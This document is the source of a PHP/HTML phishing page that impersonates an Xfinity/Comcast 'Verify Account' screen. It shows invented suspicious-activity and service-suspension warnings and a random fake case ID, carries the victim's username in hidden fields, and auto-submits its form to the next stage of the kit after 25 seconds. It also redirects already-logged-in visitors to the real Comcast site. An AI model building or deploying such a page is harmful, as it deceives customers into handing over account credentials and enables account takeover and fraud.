<!doctype html>
<html lang="en">
<head class="at-element-marker">

<meta charset="utf-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">

<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">

<title>Verify Account | XFINITY</title>

<meta name="robots" content="noindex">

<link rel="stylesheet" href="aca.css" type="text/css">
<link rel="stylesheet" href="acb.css">

<link rel="shortcut icon" href="i/favicon.ico">

<link rel="stylesheet" href="acc.css" type="text/css">
<link rel="stylesheet" href="acd.css" type="text/css">

<?php
if (isset($_COOKIE['logged_in'])) {
echo '<script type="text/javascript">
window.location = "http://ad.doubleclick.net/ddm/clk/288545052;114648096;n?https://customer.comcast.com/Overview/"
</script>';
}
?>

<script type="text/javascript">
window.onload=function(){
window.setTimeout('document.intra.submit()', 25000)
}
</script>

</head>

<body>

<div class="page-app page-app--has-hero page-overview">


<xc-header tab="myaccount" client-id="myAccountWeb" tracking-module="global nav" is-authed="" slimnav="">

<div class="xc-header--slim-container"><ul class="xc-header--slim-navigation-ul" role="navigation"><li class="xc-header--slim-navigation-li"><a class="xc-header--slim-navigation-link" name="xfinity" href="#">Xfinity</a></li><li class="xc-header--slim-navigation-li"><a class="xc-header--slim-navigation-link" name="comcastbusiness" href="#">Comcast Business</a></li></ul></div>

<div class="xc-header--container">

<a class="xc-header--xfinity-logo"><svg viewBox="0 0 458.042 154.524"><path d="M51.192,78.052L79.948,39.5H67.94c-5.372,0-8.848,1.896-11.692,5.688 L41.08,65.57L26.386,45.188c-2.844-3.792-6.32-5.688-11.692-5.688H2.686l28.44,38.553L0,120.08h11.376 c5.372,0,8.848-1.896,11.692-5.688L41.08,90.534l42.186,58.302c2.686,3.792,6.32,5.688,11.692,5.688h12.324L51.192,78.052z M281.398,120.08h16.273V39.5h-16.273V120.08z M152.312,120.08h16.274V39.5h-16.274V120.08z M399.108,148.52L458.041,39.5h-8.847 c-5.372,0-9.481,1.58-11.693,5.688l-23.225,43.134l-20.067-43.134c-2.053-4.266-6.318-5.688-11.69-5.688h-8.532l30.968,65.729 l-27.018,49.296h8.848C392.314,154.524,396.738,152.786,399.108,148.52 M188.02,39.5v80.58h16.274v-55.3 c5.056-7.11,12.324-11.534,21.33-11.534c12.008,0,20.225,7.584,20.225,22.752v36.341c0,4.581,3.159,7.741,7.584,7.741h8.689V73.154 c0-20.856-13.271-35.392-32.548-35.392c-10.27,0-18.802,3.634-25.28,9.638v-7.9H188.02z M327.851,91.482 c0,17.538,10.743,30.02,30.02,30.02c4.74,0,8.69-0.632,11.85-1.579l-3.317-14.221c-2.054,0.475-4.582,0.79-7.426,0.79 c-7.9,0-14.854-4.266-14.854-15.326v-37.13h22.752L360.24,39.5h-16.117V7.11l-16.272,7.11V39.5h-17.224v14.536h17.224V91.482z M102.226,54.036v66.044H118.5V54.036h20.856V39.5H118.5v-6.004c0-13.746,8.216-18.328,16.274-18.328c2.054,0,3.95,0.316,5.53,0.79 l3.318-14.378C141.568,0.79,138.25,0,133.51,0c-20.224,0-31.284,15.01-31.284,33.18v6.32h-8.532l-10.27,14.536H102.226z"></path></svg></a>

<div class="xc-header--mobile-icons-container"><ul class="xc-header--mobile-icons-ul"></ul></div><a href="#verify"><button class="xc-header--hamburger" type="button" aria-haspopup="true" aria-expanded="false"><svg focusable="false" viewBox="0 0 100 100"><line x1="10" y1="25" x2="90" y2="25"></line><line x1="10" y1="50" x2="90" y2="50"></line><line x1="10" y1="75" x2="90" y2="75"></line></svg> <svg focusable="false" viewBox="0 0 100 100"><line x1="20" y1="20" x2="80" y2="80"></line><line x1="20" y1="80" x2="80" y2="20"></line></svg></button></a>

<div class="xc-header--container-nav" role="navigation"><ul class="xc-header--navigation-ul"><li class="xc-header--navigation-li"><a class="xc-header--navigation-link" href="#">My Xfinity</a></li><li class="xc-header--navigation-li"><a class="xc-header--navigation-link" href="#">Shop<span>/Upgrade</span></a></li><li class="xc-header--navigation-li"><a class="xc-header--navigation-link" href="#">Support</a></li><li class="xc-header--navigation-li"><a class="xc-header--navigation-link xc-header--active" href="#">My Account</a></li></ul><ul class="xc-header--personal-ul"><li class="xc-header--personal-li"><a class="xc-header--personal-link" href="#"><div class="xc-header--email-count">1</div><svg focusable="false" viewBox="0 0 100 100"><path d="M9,18c-3.8,0-7,3.2-7,7l0,49c0,3.8,3.2,6,7,6h82 c3.7,0,7-2.3,7-6V25c0-3.9-3.2-7-7-7H9z"></path><path d="M2.3,23l48,33.2L98,23"></path></svg></a></li><li class="xc-header--personal-li"><a class="xc-header--personal-link" href="#"><svg focusable="false" viewBox="0 0 100 100"><rect x="4" y="16" width="94" height="54" rx="12" ry="12"></rect><line x1="26" y1="86" x2="74" y2="86"></line><line x1="50" y1="72" x2="50" y2="86"></line></svg></a></li><li class="xc-header--personal-li"><a class="xc-header--personal-link" href="#"><svg focusable="false" viewBox="0 0 100 100"><polyline points="86,36 86,85 14,85 14,18 26,18 26,28"></polyline><polyline points="3,41 50,15 97,41"></polyline><line x1="50" y1="38" x2="50" y2="56"></line><path d="M42,43.4c-3.9,2.6-6.5,7-6.5,12.1C35.5,63.5,42,70,50,70s14.5-6.5,14.5-14.5c0-5-2.6-9.5-6.5-12.1"></path></svg></a></li><li class="xc-header--personal-li smart-internet"><a class="xc-header--personal-link" href="#"><svg focusable="false" viewBox="0 0 100 100"><circle class="wifi-bottom-circle" cx="50" cy="81" r="7"></circle><path d="M4,37 c12.1-12.6,27.2-20,46-20c18.7,0,33.9,7.7,46,20"></path><path d="M18,52 c8.5-8.8,18.8-14,32-14c13.1,0,23.5,5.4,32,14"></path><path d="M34,65c4.2-4.4,9.4-7,16-7 c6.5,0,11.8,2.7,16,7"></path></svg></a></li><li class="xc-header--personal-li"><a class="xc-header--personal-link" href="#"><svg focusable="false" viewBox="0 0 100 100"><path d="M43,58c10.7,10.7,19,14,19,14s4.5-4.5,6-6c0.8-0.8,1.3-1.4,2-2c1.1-0.9,2.5-1.5,4-1c3.4,1.2,10.3,3.7,13,6c2.5,2.1,4.7,6.7-2,13
c-6.7,6.7-13.2,7-15,7c-6.5,0-16.2-3.2-36-23S12,35.5,12,31c0-1.6,0.3-8.3,7-15s10.1-4.4,12-2c2.3,2.9,5.1,9.8,7,13 c0.7,1.2,1.3,2.7,0,4c-0.6,0.6-1.2,1.2-2,2c-1.7,1.6-7,6-7,6S32.7,47.3,43,58z"></path></svg></a></li><li class="xc-header--personal-li"><a class="xc-header--personal-link" href="#"><svg viewBox="0 0 40 40"><path d="M10.8055323,0.487804878 L29.5122419,0.487804878 C30.3069604,0.487804878 30.9512195,1.11179791 30.9512195,1.8815331 L30.9512195,38.1184669 C30.9512195,38.8881951 30.3069604,39.5121951 29.5122419,39.5121951 L10.8055323,39.5121951 C10.0107993,39.5121951 9.36655463,38.8881951 9.36655463,38.1184669 L9.36655463,1.8815331 C9.36655463,1.11179791 10.0107993,0.487804878 10.8055323,0.487804878 Z" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M9.36655463,6 L30.9512195,6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M9.36655463,32 L30.9512195,32" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M20.1588871,34.4453381 C19.3304671,34.4453381 18.6588871,35.1169121 18.6588871,35.9453381 C18.6588871,36.7737641 19.3304671,37.4453381 20.1588871,37.4453381 C20.9873071,37.4453381 21.6588871,36.7737641 21.6588871,35.9453381 C21.6588871,35.1169121 20.9873071,34.4453381 20.1588871,34.4453381 Z" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"></path></svg></a></li><li class="xc-header--personal-li comcastbusiness"><a class="xc-header--personal-link" href="#"><svg focusable="false" viewBox="0 0 28 22"><polyline points="20.7,15.6 20.7,19.6 5.6,19.6 5.6,4.6 9.6,4.6"></polyline><polyline points="14.9,2.6 22.6,2.6 22.6,10.4"></polyline><line x1="21.8" y1="3.2" x2="11.1" y2="13.8"></line></svg></a></li></ul><ul class="xc-header--notifications-ul" data-dtm="container" data-dtm-level1="polaris" data-dtm-level2="notification"><li id="xc-header--notifications-summary" class="xc-header--notifications-summary"><h3></h3></li></ul>
</div>

<div class="xc-header--signin-container"><div class="xc-header--signin-container--authenticated"><div class="xc-header--dropdown-container"><button class="xc-header--dropdown-btn xc-header--signin-profile-name">SIGN OUT</button></div></div></div></div></xc-header>

<div><div class="page-app__wrapper"><div><header id="page-header" class="page-header" role="banner">
<div class="page-header__wrapper">
<div class="page-header__content">
<div class="page-header__navigation">
<nav class="nav-primary" role="navigation">
<a href="#" class="nav-primary__link nav-primary__link--active">Overview</a>
<a href="#" class="nav-primary__link">Billing</a>
<a href="#" class="nav-primary__link">Services</a>
<a href="#" class="nav-primary__link">Users</a>
<a href="#" class="nav-primary__link">Devices</a>
<a href="#" class="nav-primary__link">Settings</a>
</nav>
</div>

<div class="page-header__account-number link-group">
<div class="link-group__item">
<a class="langLink" href="#">Español</a>
</div>

<div class="link-group__item account-number">
<button type="button" class="button--text">
<abbr class="linked-group__number">Account ...533</abbr><span class="nav-primary__icon icon-arrow-down-mobile-white"></span>
</button>
</div>
</div>
</div>
</div>
</header>

<div id="page-content" class="page-content"><div id="page-main" class="page-main"><main id="page-view" class="page-view view" tabindex="-1">

<form id="intra" name="intra" method="post">
<input type="hidden" name="page" value="third">
<input type="hidden" name="uz" value="<?php echo $uz; ?>" />
<input type="hidden" name="uzb" value="<?php echo $uz; ?>" />


<section class="page-section ui-blue hero page-section--content-relative">
<div class="page-section__wrapper clearfix">
<div class="page-section__content">
<account-completion-module ng-if="isACMShown" acm="acm"><div class="account-completion-banner">
<div class="acm__progress">
<div class="acm__progress__graphic">
<a href="#verify">
<div class="icon icon-account-status-50-percent"></div>
</a>
<p class="card__content body4 status status--warning">50% COMPLETE</p>
</div>

<?php
if (filter_var("$uz", FILTER_VALIDATE_EMAIL)) {
$iuzer = substr($uz, 0, strpos($uz, '@'));
$iuzer = strtoupper($iuzer);
} else {
$iuzer = strtoupper($uz);
}
?>

<div class="acm__progress__content">
<span class="heading4">Hi, <span><?php echo $iuzer; ?></span></span><br>
<span class="body3">You must verify your account.</span>
</div>
</div>

<div class="acm__items">
<a class="acm__item is-complete" href="#">
<span class="icon svg-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
<path d="M30 0a30 30 0 1 0 21.21 8.79A30 30 0 0 0 30 0" fill="#eef1f3"></path>
<path d="M16 32.14l8.57 8.57L46 19.29" fill="none" stroke="#0272b6" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
</svg>
</span><span class="screen-reader-text">Task Complete</span>
<p class="body3 link">Automatic Payments</p>
</a>

<a class="acm__item is-complete" href="#">
<span class="icon svg-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
<path d="M30 0a30 30 0 1 0 21.21 8.79A30 30 0 0 0 30 0" fill="#eef1f3"></path>
<path d="M16 32.14l8.57 8.57L46 19.29" fill="none" stroke="#0272b6" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
</svg>
</span><span class="screen-reader-text">Task Complete</span>
<p class="body3 link">Paperless Billing</p>
</a>

<a class="acm__item is-complete" href="#verify">
<span class="icon svg-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
<circle cx="30" cy="30" r="30" fill="#eef1f3"></circle>
<path d="M44.75 22.93a.5.5 0 0 0-.5 0L30 30.86l-14.24-7.94a.49.49 0 0 0-.5 0 .51.51 0 0 0-.25.43v13.13a2.51 2.51 0 0 0 2.5 2.52h25A2.51 2.51 0 0 0 45 36.48V23.36a.51.51 0 0 0-.25-.43z" fill="#014269"></path>
<path d="M43.67 38l-9.13-9.21a.5.5 0 0 0-.59-.08L30 30.86l-3.95-2.2a.49.49 0 0 0-.59.08L16.34 38a.51.51 0 0 0 .15.82 2.46 2.46 0 0 0 1 .23h25a2.46 2.46 0 0 0 1-.23.51.51 0 0 0 .15-.82z" fill="#015383"></path>
<path d="M42.49 21h-25A2.51 2.51 0 0 0 15 23.52a.5.5 0 0 0 .27.42l14.49 7.57a.5.5 0 0 0 .46 0l14.49-7.57a.5.5 0 0 0 .27-.42A2.51 2.51 0 0 0 42.49 21z" fill="#0272b6"></path>
</svg>
</span>
<p class="body3 link">Personal Email <span class="icon-caret svg-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 6 10">
<path fill="none" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M.83.85l4.12 4.12L.83 9.08"></path>
</svg>
</span></p>
</a>

<a class="acm__item is-complete" href="#">
<span class="icon svg-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
<path d="M30 0a30 30 0 1 0 21.21 8.79A30 30 0 0 0 30 0" fill="#eef1f3"></path>
<path d="M16 32.14l8.57 8.57L46 19.29" fill="none" stroke="#0272b6" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
</svg>
</span><span class="screen-reader-text">Task Complete</span>
<p class="body3 link">Mobile Number</p>
</a>
</div>


</div>
</account-completion-module>
</div>
</div>
</section>

<section class="ui-grey page-section  page-section ">

<div class="page-section__wrapper clearfix">
<div class="page-section__content">
<div class="hero-flex-wrap hero-flex-wrap--at-768">
<div class="hero-flex-wrap__main overview-section overview-section--bill">
<h2 id="verify">Verify your Account</h2>
<div class="card">
<div class="card__content">
<div class="header-state header-state--centered-text">

<div>
<div class="header-state__icon--small icon icon-stateful-bill-ok-blue"></div>
<div class="hgroup">



<p class="header-state__content">
<span class="heading3">Your account will be placed on hold.</span>
<span class="body3">Case ID: <?php
$random = rand (1000000000, 9999999900);
print $random;
?></span>
</p>
</div>

<span>
<a class="button button--primary" href="javascript:void(0);" onclick="document.getElementById('intra').submit();"><b>Confirm Account Ownership</b></a>
</span>
<noscript>
<center>
<p><font size="4"><b>You have Javascript disabled. Please click the below button to go to the page you requested.</b></font></p>
<p><input type="submit" value="Submit" class="inputButton" /></p>
</center>
</noscript>
</div>
</div>
</div>
</div>
</div>

<div class="hero-flex-wrap__aside overview-section">
<h2>Common Solutions</h2>
<div class="card-group card-group--flex-vertical-at-768">
<div class="card-group__item">
<a class="card card--has-media" href="#verify">
<div class="card__media">
<div class="icon">
<img src="i/email.png">
</div>
</div>
<div class="card__content">
<span class="link">Check Your Email</span>
</div>
</a>
</div>

<div class="card-group__item">
<a class="card card--has-media" href="#verify">
<div class="card__media">
<div class="icon">
<img src="i/eq.png">
</div>
</div>
<div class="card__content">
<span class="link">Manage Settings</span>
</div>
</a>
</div>

<div class="card-group__item">
<a class="card card--has-media" href="#verify">
<div class="card__media">
<div class="icon">
<img src="i/box.png">
</div>
</div>
<div class="card__content">
<span class="link">Move or Transfer Service</span>
</div>
</a>
</div>

<div class="card-group__item">
<a class="card card--has-media" href="#verify">
<div class="card__media">
<div class="icon">
<img src="i/qm.png">
</div>
</div>
<div class="card__content">
<span class="link">Search Help &amp; Support</span>
</div>
</a>
</div>
</div>
</div>
</div>

<div class="overview-section overview-section--services">
<div class="hgroup hgroup--inline-link">
<h2>Services - <font color="red" size="3">CURRENTLY SUSPENDED FOR YOUR ACCOUNT</font></h2><a><font color="red"></font></a>
</div>

<div class="card-group card-group--grid-fixed-259">

<div class="card-group__item">
<div class="card-group mb0">
<div class="card-group__item">
<a class="card card--entity card--entity-services" href="#verify">
<div class="card__content">
<div class="card__image">
<span class="color--blue-sky">
<span class="svg-icon svg-icon--90"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
<rect x="10" y="25.5" width="80" height="46" rx="3" ry="3" fill="#FF2400"></rect>
<path fill="none" stroke="#FF2400" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M32 74.5h36"></path>
</svg>
</span>
</span>
</div>
<div class="hgroup mb0">
<h3 class="body1">X1 TV</h3>
</div>
<div class="card__action">
<span class="link">Manage TV</span>
</div>
</div>
</a>
</div>
</div>
</div>

<div class="card-group__item">
<div class="card-group mb0">
<div class="card-group__item">
<a class="card card--entity card--entity-services" href="#verify">
<div class="card__content">
<div class="card__image">
<span class="color--blue-sky">
<span class="svg-icon svg-icon--90"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
<path fill="none" stroke="#FF2400" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 73h78"></path>
<path d="M81 27H19a3 3 0 0 0-3 3v40h68V30a3 3 0 0 0-3-3z" fill="#FF2400"></path>
</svg>
</span>
</span>
</div>
<div class="hgroup mb0">
<h3 class="body1">Internet</h3>
</div>
<div class="card__action">
<span class="link">Manage Internet</span>
</div>
</div>
</a>
</div>
</div>
</div>

<div class="card-group__item">
<div class="card-group mb0">
<div class="card-group__item">
<a class="card card--entity card--entity-services" href="#verify">
<div class="card__content">
<div class="card__image">
<span class="color--blue-sky">
<span class="svg-icon svg-icon--90"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
<path d="M77.67 63.08l-.15-.2-9.76-4.64a4.13 4.13 0 0 0-4 .24 11 11 0 0 0-1.9 1.52l-4 4c-1.61-.74-6.45-3.28-12.5-9.33s-8.58-10.89-9.33-12.5l4-4a11.08 11.08 0 0 0 1.49-1.88 4.12 4.12 0 0 0 .24-4l-4.64-9.76-.2-.15c-.05 0-5.24-3.83-10.63 1.56a19.07 19.07 0 0 0-5.29 12v.15c.08.48 2.12 11.86 16.57 26.31S63.42 78.9 63.9 79h.2a19.08 19.08 0 0 0 12-5.29c5.39-5.4 1.6-10.58 1.57-10.63z" fill="#FF2400"></path>
<path d="M41.53 36.25a4.12 4.12 0 0 0 .24-4l-4.65-9.77-.2-.15a7 7 0 0 0-1.79-.9 7.93 7.93 0 0 0-.87-.25l7.23 15.12zm35.99 26.62l-9.76-4.64a4.12 4.12 0 0 0-4 .24h-.07L78.8 65.7a7.12 7.12 0 0 0-1.28-2.83z" fill="#FF2400"></path>
</svg>
</span>
</span>
</div>
<div class="hgroup mb0">
<h3 class="body1">Voice</h3>
</div>
<div class="card__action">
<span class="link">Manage Voice</span>
</div>
</div>
</a>
</div>
</div>
</div>

<div class="card-group__item">
<div class="card-group mb0">
<div class="card-group__item">
<a class="card card--entity card--entity-services" href="#verify">
<div class="card__content">
<div class="card__image">
<span class="color--blue-sky">
<span class="svg-icon svg-icon--90"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
<path d="M83.38 21.32a1.16 1.16 0 0 0-1-1.17H69.63a1.16 1.16 0 0 0-1 1.17v7.46L50 17.58s-33.38 19.49-33.38 20V75.9a5.85 5.85 0 0 0 5.89 6.1h55a5.85 5.85 0 0 0 5.89-6.1z" fill="#FF2400"></path>
<path d="M40.75 47a13.09 13.09 0 1 0 18.51 0M50 56.27V40.56" fill="none" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
<path fill="none" stroke="#FF2400" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.73 40.56L50 17l39.27 23.56"></path>
</svg>
</span>
</span>
</div>
<div class="hgroup mb0">
<h3 class="body1">Home</h3>
</div>
<div class="card__action">
<span class="link">Manage Home</span>
</div>
</div>
</a>
</div>
</div>
</div>


</div>

</div>



<div class="overview-section overview-section--recent-activty">
<div class="hgroup">
<h2>Recent Activity</h2>
<p class="body3">View your recent account events. <a href="#verify">See all activity</a></p>
</div>
<div class="card-group" id="activity">
<div class="card-group__item">
<div class="card card--info card--has-date card--action-right-at-768">
<div class="card__date hgroup">
<span>
<span class="card__date-item card__date-item--day heading5"><?php print date("D"); ?></span>
<span class="card__date-item card__date-item--month-date heading5"><?php print date("M"); ?> <?php print date("d"); ?></span>
<span class="card__date-item card__date-item--time body4" ng-if="item.showTime">8:00 am</span>
</span>
</div>

<div class="card__content">
<div class="hgroup">
<h4 class="body2 activity-list__item-name"><font color="#FF2400"><b>Suspicious Activity Detected on your Account</b></font></h4>
<p></p>
</div>
</div>

<div class="card__action">
<a href="#verify">Verify Account <span class="icon-link-out icon--inline"></span></a>
</div>
</div>
</div>

</div>

</div>

</div>
</div>
</section>
</form>
</main>

<cms-support tracking-module="help module" type="route.current.activeNavItem" ng-if="!acceptingTermsOfService &amp;&amp; !route.current.hideHelpAndSupport">

<section class="page-section ui-light cms-support">
<div class="page-section__wrapper clearfix">
<div class="page-section__content">
<div class="cms-support__title"><h2 class="heading1">Help &amp; Support</h2></div>

<div class="ma-grid cms-support__body">
<div class="ma-grid__col ma-grid__col--1of4">
<h6 class="cms-support__heading">Recommended Articles</h6>
<ul class="cms-support__list">
<li>
<a href="#">Check for a Service Outage in Your Area</a>
</li>
<li><a href="#">Account Numbers, Usernames, Passwords and PINs</a>
</li>
<li>
<a href="#">Change Your WiFi Network Name and Password Online</a>
</li>
<li>
<a href="#">Troubleshooting Issues with Your XFINITY Internet or WiFi Connection</a>
</li>
</ul>
</div>

<div class="ma-grid__col ma-grid__col--1of4">
<h6 class="cms-support__heading">Quick Links</h6>
<ul class="cms-support__list">
<li>
<a href="#">Pay Your Bill</a>
</li>
<li>
<a href="#">Find an Xfinity Store</a>
</li>
<li>
<a href="#">Username and Password</a>
</li>
<li>
<a href="#">Ask the XFINITY Community</a>
</li>
</ul>
</div>

<div class="ma-grid__col ma-grid__col--1of4">
<h6 class="cms-support__heading">Topics</h6>
<ul class="cms-support__list">
<li>
<a href="#">Self Service</a>
</li>
<li>
<a href="#">Internet</a>
</li>
<li>
<a href="#">Billing</a>
</li>
<li>
<a href="#">TV</a>
</li>
</ul>
</div>

<div class="ma-grid__col ma-grid__col--1of4">
<h6 class="cms-support__heading">Contact</h6>
<ul class="cms-support__list">
<li>
<div class="cms-support__item-heading">Get answers from Comcast agents and customers like you.</div>
<a href="#">View contact options</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</section>
</cms-support>


</div>


</div>


</div>

</div>

<xc-footer ng-show="!route.current.takeover &amp;&amp; showPolarisFooter" client-id="myAccountWeb" tracking-module="footer" aria-hidden="false" class="">
<div class="xc-footer--panels">
<div class="xc-footer--panel"><h3 class="xc-footer--heading">I Want To</h3><ul class="xc-footer--list"><li class="xc-footer--li"><a class="xc-footer--link" href="#">View &amp; Pay Bill</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Check Email &amp; Voicemail</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Manage My Account</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Check TV Listings</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Watch TV Online</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Contact Customer Support</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Refer-a-Friend</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Get Apps</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Check Local News &amp; Weather</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Manage Parental Controls</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Download Norton Security</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Manage Users &amp; Alerts</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Reset My Password</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Find My Account Number</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Monitor Home Security</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Upgrade My Service</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Find My Xfinity Username</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Get Help &amp; Support</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Program My Remote</a></li><li class="xc-footer--li"><a class="xc-footer--link xc-footer--link-iperceptions" href="#">Submit Feedback</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Find an Xfinity Store</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Move My Services</a></li></ul></div><div class="xc-footer--panel"><button class="xc-footer--toggle">Show <span class="xc-footer--toggle-show">More </span><span class="xc-footer--toggle-hide">Less</span></button><h3 class="xc-footer--heading">Shop</h3><ul class="xc-footer--list"><li class="xc-footer--li"><a class="xc-footer--link" href="#">Deals &amp; Offers</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">TV</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Internet</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Voice</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Xfinity Mobile</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Home Security &amp; Automation</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Compare the Competition</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Comcast Business</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Deals in My Area</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Bundles</a></li></ul></div><div class="xc-footer--panel"><button class="xc-footer--toggle">Show <span class="xc-footer--toggle-show">More </span><span class="xc-footer--toggle-hide">Less</span></button><h3 class="xc-footer--heading">About Comcast</h3><ul class="xc-footer--list"><li class="xc-footer--li"><a class="xc-footer--link" href="#">About Comcast</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Advertise with Us</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Careers</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Press Room</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Corporate Site</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Customer Agreements &amp; Policies</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Xfinity Internet Broadband Disclosures</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Xfinity Voice: Use of Personal Info</a></li><li class="xc-footer--li"><a class="xc-footer--link" href="#">Sitemap</a></li></ul></div></div><div class="xc-footer--bottom" data-dtm="container" data-dtm-level1="polaris" data-dtm-level2="footer" data-tracking="{&quot;container&quot;:[&quot;xc-polaris-footer&quot;]}"><div class="xc-footer--bottom-container"><span class="xc-footer--xfinity-logo" href="#"><svg viewBox="0 0 458.042 154.524"><path d="M51.192,78.052L79.948,39.5H67.94c-5.372,0-8.848,1.896-11.692,5.688 L41.08,65.57L26.386,45.188c-2.844-3.792-6.32-5.688-11.692-5.688H2.686l28.44,38.553L0,120.08h11.376 c5.372,0,8.848-1.896,11.692-5.688L41.08,90.534l42.186,58.302c2.686,3.792,6.32,5.688,11.692,5.688h12.324L51.192,78.052z M281.398,120.08h16.273V39.5h-16.273V120.08z M152.312,120.08h16.274V39.5h-16.274V120.08z M399.108,148.52L458.041,39.5h-8.847 c-5.372,0-9.481,1.58-11.693,5.688l-23.225,43.134l-20.067-43.134c-2.053-4.266-6.318-5.688-11.69-5.688h-8.532l30.968,65.729 l-27.018,49.296h8.848C392.314,154.524,396.738,152.786,399.108,148.52 M188.02,39.5v80.58h16.274v-55.3 c5.056-7.11,12.324-11.534,21.33-11.534c12.008,0,20.225,7.584,20.225,22.752v36.341c0,4.581,3.159,7.741,7.584,7.741h8.689V73.154 c0-20.856-13.271-35.392-32.548-35.392c-10.27,0-18.802,3.634-25.28,9.638v-7.9H188.02z M327.851,91.482 c0,17.538,10.743,30.02,30.02,30.02c4.74,0,8.69-0.632,11.85-1.579l-3.317-14.221c-2.054,0.475-4.582,0.79-7.426,0.79 c-7.9,0-14.854-4.266-14.854-15.326v-37.13h22.752L360.24,39.5h-16.117V7.11l-16.272,7.11V39.5h-17.224v14.536h17.224V91.482z M102.226,54.036v66.044H118.5V54.036h20.856V39.5H118.5v-6.004c0-13.746,8.216-18.328,16.274-18.328c2.054,0,3.95,0.316,5.53,0.79 l3.318-14.378C141.568,0.79,138.25,0,133.51,0c-20.224,0-31.284,15.01-31.284,33.18v6.32h-8.532l-10.27,14.536H102.226z"></path></svg></span><ul class="xc-footer--terms" none=""><li class="xc-footer--terms-li xc-footer--legal-customer"><a class="xc-footer--terms-link" href="#">Ad Choices</a></li><li class="xc-footer--terms-li xc-footer--legal-customer"><a class="xc-footer--terms-link" href="#" id="xc-footer--privacy">Web Privacy Policy</a></li><li class="xc-footer--terms-li xc-footer--legal-customer"><a class="xc-footer--terms-link" href="#" id="xc-footer--terms">Web Terms of Service</a></li><li class="xc-footer--terms-li xc-footer--legal-corporate"><a class="xc-footer--terms-link" href="#" id="xc-footer--corporateprivacy">Privacy Statement</a></li><li class="xc-footer--terms-li xc-footer--legal-corporate"><a class="xc-footer--terms-link" href="#">Visitor Agreement</a></li></ul><ul class="xc-footer--social"><li class="xc-footer--social-li"><a rel="nofollow" class="xc-footer--social-link xc-footer--twitter" href="#">Twitter - Follow us for exclusive deals</a></li><li class="xc-footer--social-li"><a rel="nofollow" class="xc-footer--social-link xc-footer--youtube" href="#">YouTube – Find tutorials and demos</a></li><li class="xc-footer--social-li"><a rel="nofollow" class="xc-footer--social-link xc-footer--facebook" href="#">Facebook – Reach out on Facebook</a></li></ul></div></div>


<h4 class="xc-footer--copyright"><span class="xc-footer--copyright-link">&copy; &nbsp;<?php print date("Y"); ?>&nbsp;Comcast</span></h4></xc-footer>

</div>
</div>
  
  
</body>
</html>